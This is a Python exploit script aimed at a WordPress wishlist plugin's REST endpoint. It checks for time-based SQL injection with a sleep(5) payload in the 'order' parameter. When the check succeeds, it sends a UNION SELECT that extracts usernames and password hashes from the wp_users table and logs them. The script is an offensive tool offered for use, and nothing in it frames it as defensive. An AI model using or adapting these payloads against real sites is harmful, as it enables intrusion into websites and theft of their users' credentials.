import requests
import logging

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


def test_sql_injection(url: str, params: dict, delay_threshold: int = 5) -> bool:
    try:
        response = requests.get(url, params=params)
        if response.elapsed.total_seconds() > delay_threshold:
            logging.info("[+] The site is vulnerable to SQL injection (time delay confirmed).")
            return True
        else:
            logging.info("[-] The site doesn't appear to be vulnerable to this SQL injection.")
            return False
    except requests.RequestException as e:
        logging.error(f"[-] Error during the request: {e}")
        return False


def exploit_sql_injection(url: str, exploit_params: dict) -> None:
    try:
        exploit_response = requests.get(url, params=exploit_params)
        if exploit_response.status_code == 200:
            logging.info("[+] Exploit successful, data retrieved:")
            logging.info(exploit_response.text)
        else:
            logging.warning(f"[-] Exploit failed, status code: {exploit_response.status_code}")
    except requests.RequestException as e:
        logging.error(f"[-] Error during the exploitation attempt: {e}")


if __name__ == "__main__":
    base_url = "http://target-site.com/wp-json/wishlist/v1/{share_key}/get_products"

    malicious_payload = "'; SELECT sleep(5);--"
    params = {
        'count': '10',
        'offset': '0',
        'order': malicious_payload
    }

    if test_sql_injection(base_url, params):
        exploit_payload = "' UNION SELECT user_login, user_pass FROM wp_users --"
        exploit_params = {
            'count': '10',
            'offset': '0',
            'order': exploit_payload
        }
        exploit_sql_injection(base_url, exploit_params)
